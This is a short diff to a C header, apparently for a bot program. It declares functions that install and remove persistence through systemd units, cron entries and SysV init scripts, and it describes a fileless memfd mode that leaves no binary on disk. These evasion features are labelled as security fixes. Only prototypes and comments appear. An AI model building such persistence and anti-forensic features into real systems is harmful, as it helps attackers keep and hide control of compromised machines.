@@ -15,6 +15,11 @@
 /* ── Functions ───────────────────────────────────────────────── */
 int detect_init_system(void);
 int persist_install(notnet_bot_t *bot);
+/* SECURITY FIX (#130): uninstall every launch point installed by
+ * persist_install() (systemd unit, cron entries, SysV init script)
+ * and delete the disk-backed binary. Best-effort: returns 0 if at
+ * least one artifact was removed, -1 otherwise. */
+int persist_remove(notnet_bot_t *bot);
 /* SECURITY FIX (#84): RAM-only fileless mode. When persist_enabled=0 the
  * bot relaunches itself from an anonymous memfd (Linux) so no disk-backed
  * executable exists; no-op when persistence is enabled, when already
